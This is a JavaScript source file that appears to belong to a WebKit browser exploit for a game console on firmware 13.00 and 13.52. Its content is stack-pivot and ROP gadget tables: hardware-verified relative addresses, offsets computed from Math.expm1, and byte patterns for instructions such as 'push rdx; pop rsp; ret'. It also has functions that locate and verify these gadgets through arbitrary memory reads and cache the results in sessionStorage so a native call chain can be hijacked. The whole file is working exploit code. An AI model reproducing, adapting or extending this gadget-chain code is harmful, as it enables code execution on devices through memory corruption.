/**
 * Pivot/call chain gadgets for Math.expm1 native call.
 * 13.00 RVAs are scan hints only — NOT valid on 13.52 until HW-verified or scanned.
 */

/** 13.00 proven row — use as scan hints near-search only */
export const PIVOT_HINTS_1300 = {
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x548b,
    wk_PUSH_RDX_POP_RSP_RET:      0x2abccaa,
    wk_MOV_RDI_RSI_30_CALL:       0x295f948,
    wk_POP_RAX_MOV_RAX_JMP_18:    0x1d989e3,
    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x25bae0,
    wk_MOV_RDI_RAX_8_CALL_20:     0x4a0406,
    wk_MOV_RDX_RAX_18_CALL_10:    0x1ec3ada,
    pivot_view_sp:                0x38,
};

/** 13.52 retail — HW full poops gadgets (Aug 30: expm1 probe G0/G1/G4, scan G2/G3) */
export const PIVOT_HW_1352 = {
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1f9bb,
    wk_MOV_RDI_RSI_30_CALL:       0x128f418,  /* expm1+0x3d90c8, full 9-byte */
    wk_POP_RAX_MOV_RAX_JMP_18:    0x6c84b3,   /* expm1+delta, full 7-byte */
    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x246750,   /* low .text full scan */
    wk_MOV_RDI_RAX_8_CALL_20:     0x487d2,    /* low .text full scan */
    wk_MOV_RDX_RAX_18_CALL_10:    0x7f35aa,   /* expm1+delta, full 10-byte */
    wk_PUSH_RDX_POP_RSP_RET:      0x13ec77a,  /* expm1+0x53642a */
};

/** Stable G5−G0 offset in libSceNKWebKit (11.50–13.00 decrypted modules) */
export const G5_DELTA_FROM_G0 = 0x15d362;

/** G5 − expm1 — stable on 13.00/13.52 (HW G5 @ expm1+this on 13.52) */
export const G5_EXPM1_DELTA = 0x53642a;

/** G0 − expm1 — stable 13.00→13.52 (13.00 G0 @ 0x295f948, expm1 @ 0x2586880) */
export const G0_EXPM1_DELTA = 0x3d90c8;

const EXPM1_1300 = 0x2586880;

/** Signed expm1 deltas from 13.00 poops row — same method as G5_EXPM1_DELTA. */
export const PIVOT_EXPM1_DELTA = {
    wk_MOV_RDI_RSI_30_CALL:       G0_EXPM1_DELTA,
    wk_POP_RAX_MOV_RAX_JMP_18:    0x1d989e3 - EXPM1_1300,
    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x25bae0 - EXPM1_1300,
    wk_MOV_RDI_RAX_8_CALL_20:     0x4a0406 - EXPM1_1300,
    wk_MOV_RDX_RAX_18_CALL_10:    0x1ec3ada - EXPM1_1300,
    wk_PUSH_RDX_POP_RSP_RET:      G5_EXPM1_DELTA,
};

export const WEBKIT_RVA_PAD = 0x100000;
export const WEBKIT_RVA_PROBE_KEY = "wk-rva-max";

function isWebkitCodeRvaKey(k, v) {
    if (typeof v !== "number" || v < 0x10000 || v >= 0x4000000) return false;
    if (k === "fw_status" || k === "alias_of" || k === "pivot_view_sp") return false;
    if (k.startsWith("wk___imp") || k.startsWith("k_")) return false;
    if (k.indexOf("m_") >= 0 || k.indexOf("ArrayBuffer") >= 0 || k.indexOf("JSFunction") >= 0)
        return false;
    return true;
}

/** Highest known code RVA from offset tables + pad (excludes IAT/data — those OOM on 13.52). */
export function webkitRvaMaxFromOff(off) {
    let max = 0x100000;
    const bags = [off, PIVOT_HW_1352, PIVOT_HINTS_1300];
    for (let b = 0; b < bags.length; b++) {
        const src = bags[b];
        if (!src) continue;
        for (const k of Object.keys(src)) {
            const v = src[k];
            if (isWebkitCodeRvaKey(k, v) && v > max) max = v;
        }
    }
    return max + WEBKIT_RVA_PAD;
}

export function saveWebkitRvaProbe(rva) {
    try { sessionStorage.setItem(WEBKIT_RVA_PROBE_KEY, rva.toString(16)); } catch (_) { }
}

/** Safe upper bound for webkitBase+RVA reads/scans on 13.52 (HW probe may tighten). */
export function webkitRvaMax(off) {
    let max = webkitRvaMaxFromOff(off);
    try {
        if (typeof sessionStorage !== "undefined") {
            const probed = parseInt(sessionStorage.getItem(WEBKIT_RVA_PROBE_KEY), 16);
            if (probed > 0x10000 && probed + WEBKIT_RVA_PAD < max) max = probed + WEBKIT_RVA_PAD;
        }
    } catch (_) { }
    return max;
}

export function g5RvaSafe(rva, off) {
    return rva >= 0x10000 && rva <= webkitRvaMax(off);
}

export function g5Expm1Hint(off) {
    return pivotExpm1HintFor("wk_PUSH_RDX_POP_RSP_RET", off);
}

/** expm1 + stable 13.00 delta — how G5 @ +0x13ec77a was found on 13.52 HW. */
export function pivotExpm1HintFor(key, off) {
    const e = off && off.wk_expm1_builtin;
    if (!e) return 0;
    const d = PIVOT_EXPM1_DELTA[key];
    if (d == null) return 0;
    const rva = (e + d) | 0;
    if (rva < 0x10000 || rva >= 0x4000000) return 0;
    return rva;
}

/** G0 from confirmed G5 — G5−G0 stable @ 0x15d362 across 11.50–13.52 modules. */
export function pivotG0FromG5(g5rva) {
    if (g5rva == null || g5rva < 0x10000) return 0;
    const rva = (g5rva - G5_DELTA_FROM_G0) | 0;
    if (rva < 0x10000) return 0;
    return rva;
}

/** Best probe hint: G5−Δ for G0, else expm1+delta, else HW/low prefix table. */
export function pivotProbeHint(key, off, found) {
    if (key === "wk_MOV_RDI_RSI_30_CALL") {
        const g5 = (found && found.wk_PUSH_RDX_POP_RSP_RET != null)
            ? found.wk_PUSH_RDX_POP_RSP_RET
            : (off && off.wk_PUSH_RDX_POP_RSP_RET);
        const fromG5 = pivotG0FromG5(g5);
        if (fromG5 > 0) return fromG5;
    }
    const exp = pivotExpm1HintFor(key, off || found);
    if (exp > 0) return exp;
    if (off && off[key] != null) return off[key];
    if (found && found[key] != null) return found[key];
    return pivotHint(key);
}

export function g5DerivedHint(found) {
    const g0 = (found && found.wk_MOV_RDI_RSI_30_CALL != null)
        ? found.wk_MOV_RDI_RSI_30_CALL
        : PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;
    if (g0 == null) return 0;
    return g0 + G5_DELTA_FROM_G0;
}

export function pivotHint(key) {
    if (PIVOT_HW_1352[key] != null) return PIVOT_HW_1352[key];
    if (key === "wk_PUSH_RDX_POP_RSP_RET") return 0;
    return PIVOT_HINTS_1300[key] || 0;
}

/** Pick scan hint for hit selection — prefer HW/low, else cluster of known pivot RVAs */
export function pivotScanHint(key, found, scanMax, off) {
    const hw = PIVOT_HW_1352[key];
    if (hw != null && hw < scanMax) return hw;
    if (key === "wk_PUSH_RDX_POP_RSP_RET") {
        const expm1 = g5Expm1Hint(off || found);
        if (expm1 > 0 && expm1 < scanMax) return expm1;
        const derived = g5DerivedHint(found);
        if (derived > 0 && derived < scanMax) return derived;
    }
    if (key === "wk_MOV_RDI_RSI_30_CALL") {
        const g5 = (found && found.wk_PUSH_RDX_POP_RSP_RET != null)
            ? found.wk_PUSH_RDX_POP_RSP_RET
            : (off && off.wk_PUSH_RDX_POP_RSP_RET);
        const fromG5 = pivotG0FromG5(g5);
        if (fromG5 > 0 && fromG5 < scanMax) return fromG5;
        const expG0 = pivotExpm1HintFor(key, off || found);
        if (expG0 > 0 && expG0 < scanMax) return expG0;
    }
    const table = pivotHint(key);
    if (table > 0 && table < scanMax) return table;
    const known = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const k = PIVOT_ROWS[i][1];
        if (k === key) continue;
        const r = (found && found[k] != null) ? found[k] : PIVOT_HW_1352[k];
        if (r != null) known.push(r);
    }
    if (known.length === 0) return 0;
    known.sort((a, b) => a - b);
    return known[Math.floor(known.length / 2)];
}

/** Prefix patterns (scan hints) — execution must match PIVOT_EXEC_PATTERNS. */
export const PIVOT_ROWS = [
    ["MOV_RDI_RAX", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

/** Full poops chain gadgets — partial prefix match is NOT enough to fire. */
export const PIVOT_EXEC_PATTERNS = {
    G0: [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10],
    G1: [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18],
    G2: [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10],
    G3: [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20],
    G4: null,
    G5: null,
};

/** G5 accepts any stack-pivot-from-rdx gadget (13.52 may differ from 13.00 push/pop) */
export const G5_PATTERNS = [
    { pat: [0x52, 0x5c, 0xc3], kind: "push rdx; pop rsp; ret" },
    { pat: [0x41, 0x52, 0x5c, 0xc3], kind: "rex push rdx; pop rsp; ret" },
    { pat: [0x4d, 0x52, 0x5c, 0xc3], kind: "rex.wrb push rdx; pop rsp; ret" },
    { pat: [0x48, 0x89, 0xd4, 0xc3], kind: "mov rsp, rdx; ret" },
    { pat: [0x48, 0x87, 0xe2, 0xc3], kind: "xchg rsp, rdx; ret" },
];

export function checkG5Bytes(read1, base, rva) {
    if (rva == null || !base) return null;
    for (let i = 0; i < G5_PATTERNS.length; i++) {
        const g = G5_PATTERNS[i];
        if (checkPivotBytes(read1, base, rva, g.pat)) return g;
    }
    return null;
}

export const PIVOT_KEYS = PIVOT_ROWS.map(r => r[1]);

export function pivotPattern(row, off) {
    const label = row[0];
    let pat = row[2];
    if (label === "G4" && off && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    return pat;
}

/** Full execution pattern for G0-G4 (null = use pivotPattern prefix only). */
export function pivotExecPattern(label, off) {
    if (label === "G4") {
        const sp = (off && off.pivot_view_sp != null) ? (off.pivot_view_sp & 0xff) : 0x38;
        return [0x48, 0x8b, 0x50, sp, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10];
    }
    const p = PIVOT_EXEC_PATTERNS[label];
    if (p) return p;
    return null;
}

export function pivotVerifyPattern(row, off) {
    const exec = pivotExecPattern(row[0], off);
    if (exec) return exec;
    return pivotPattern(row, off);
}

export function checkPivotBytes(read1, base, rva, pat) {
    if (rva == null || !base) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1(a.add32(i));
        if (b == null || (b & 0xff) !== pat[i]) return false;
    }
    return true;
}

export function verifyPivotSet(read1, base, off) {
    const good = [];
    const bad = [];
    const missing = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        const label = row[0];
        const key = row[1];
        const rva = off[key];
        if (rva == null) {
            missing.push(label);
            continue;
        }
        if (label === "G5") {
            const g = checkG5Bytes(read1, base, rva);
            if (g) good.push(label + " (" + g.kind + ")");
            else bad.push(label);
            continue;
        }
        const pat = pivotVerifyPattern(row, off);
        const prefix = pivotPattern(row, off);
        const fullOk = checkPivotBytes(read1, base, rva, pat);
        const prefixOk = pat !== prefix && checkPivotBytes(read1, base, rva, prefix);
        if (fullOk)
            good.push(label);
        else if (prefixOk)
            bad.push(label + " (prefix-only — FULL gadget mismatch, fire OOMs)");
        else
            bad.push(label);
    }
    return {
        ok: bad.length === 0 && missing.length === 0,
        good,
        bad,
        missing,
        count: good.length,
        total: PIVOT_ROWS.length,
    };
}

/** Prefix-byte verify — matches Aug 28 HW scan (4-byte G0-G4, unlocks bisect). */
export function verifyPivotSetPrefix(read1, base, off) {
    const good = [];
    const bad = [];
    const missing = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        const label = row[0];
        const key = row[1];
        const rva = off[key];
        if (rva == null) {
            missing.push(label);
            continue;
        }
        if (label === "G5") {
            const g = checkG5Bytes(read1, base, rva);
            if (g) good.push(label + " (" + g.kind + ")");
            else bad.push(label);
            continue;
        }
        const pat = pivotPattern(row, off);
        if (checkPivotBytes(read1, base, rva, pat))
            good.push(label);
        else
            bad.push(label);
    }
    return {
        ok: bad.length === 0 && missing.length === 0,
        good,
        bad,
        missing,
        count: good.length,
        total: PIVOT_ROWS.length,
    };
}

/** Persist full-pattern RVAs that replace stale HW prefix-only hits (G0-G4). */
export const PIVOT_FULL_KEY = "wk-pivot-full";
export const PIVOT_FULL_BASE_KEY = "wk-pivot-full-base";

export function loadPivotFullOverride() {
    try {
        const raw = sessionStorage.getItem(PIVOT_FULL_KEY);
        if (!raw) return null;
        return JSON.parse(raw);
    } catch (_) {
        return null;
    }
}

export function savePivotFullOverride(base, found) {
    if (!found || typeof found !== "object") return;
    try {
        const prev = loadPivotFullOverride() || {};
        const merged = Object.assign({}, prev);
        for (const key of Object.keys(found)) {
            if (found[key] != null && PIVOT_KEYS.indexOf(key) >= 0)
                merged[key] = found[key];
        }
        sessionStorage.setItem(PIVOT_FULL_KEY, JSON.stringify(merged));
        if (base) sessionStorage.setItem(PIVOT_FULL_BASE_KEY, String(base));
    } catch (_) { }
}

export function clearPivotFullOverride() {
    try {
        sessionStorage.removeItem(PIVOT_FULL_KEY);
        sessionStorage.removeItem(PIVOT_FULL_BASE_KEY);
    } catch (_) { }
}

/** Apply session full-pattern overrides (saved after scan on prefix-only HW miss). */
export function mergePivotFullOff(off, webkitBase) {
    const full = loadPivotFullOverride();
    if (!full) return off;
    try {
        const savedBase = sessionStorage.getItem(PIVOT_FULL_BASE_KEY);
        if (savedBase && webkitBase && String(webkitBase) !== savedBase) return off;
    } catch (_) { }
    const out = Object.assign({}, off);
    for (const key of Object.keys(full)) {
        if (full[key] != null && PIVOT_KEYS.indexOf(key) >= 0)
            out[key] = full[key];
    }
    return out;
}

export function mergeScannedPivot(off, scanned) {
    if (!scanned || typeof scanned !== "object") return off;
    const out = Object.assign({}, off, PIVOT_HW_1352);
    for (let i = 0; i < PIVOT_KEYS.length; i++) {
        const key = PIVOT_KEYS[i];
        /** HW-confirmed RVAs must not be replaced by stale scan false-positives */
        if (PIVOT_HW_1352[key] != null) continue;
        if (scanned[key] != null) out[key] = scanned[key];
    }
    if (scanned.pivot_view_sp != null)
        out.pivot_view_sp = scanned.pivot_view_sp;
    else if (out.pivot_view_sp == null)
        out.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
    return out;
}

/** Drop HW keys from session — scan used to poison G0-G4 with wrong hits */
export function sanitizeScannedPivotStorage() {
    try {
        const raw = sessionStorage.getItem("wk-scanned-pivot");
        if (!raw) return false;
        const scanned = JSON.parse(raw);
        if (!scanned || typeof scanned !== "object") return false;
        let dirty = false;
        for (const key of Object.keys(scanned)) {
            if (PIVOT_HW_1352[key] != null) {
                delete scanned[key];
                dirty = true;
            }
        }
        if (!Object.keys(scanned).length) {
            sessionStorage.removeItem("wk-scanned-pivot");
            sessionStorage.removeItem("wk-scanned-pivot-base");
            return true;
        }
        if (dirty)
            sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(scanned));
        return dirty;
    } catch (_) {
        return false;
    }
}

export function loadScannedPivot() {
    try {
        const raw = sessionStorage.getItem("wk-scanned-pivot");
        if (!raw) return null;
        return JSON.parse(raw);
    } catch (_) {
        return null;
    }
}

/** Persist only non-HW keys (G5) — never store scan hits over G0-G4 */
export function saveScannedPivot(base, found) {
    const slim = {};
    if (found && typeof found === "object") {
        for (let i = 0; i < PIVOT_KEYS.length; i++) {
            const key = PIVOT_KEYS[i];
            if (found[key] == null) continue;
            if (PIVOT_HW_1352[key] != null) continue;
            slim[key] = found[key];
        }
    }
    try {
        const prev = loadScannedPivot() || {};
        const merged = Object.assign({}, prev);
        for (const key of Object.keys(slim))
            merged[key] = slim[key];
        for (const key of Object.keys(PIVOT_HW_1352))
            delete merged[key];
        if (Object.keys(merged).length) {
            sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(merged));
            if (base) sessionStorage.setItem("wk-scanned-pivot-base", String(base));
        } else {
            sessionStorage.removeItem("wk-scanned-pivot");
            sessionStorage.removeItem("wk-scanned-pivot-base");
        }
    } catch (_) { }
}
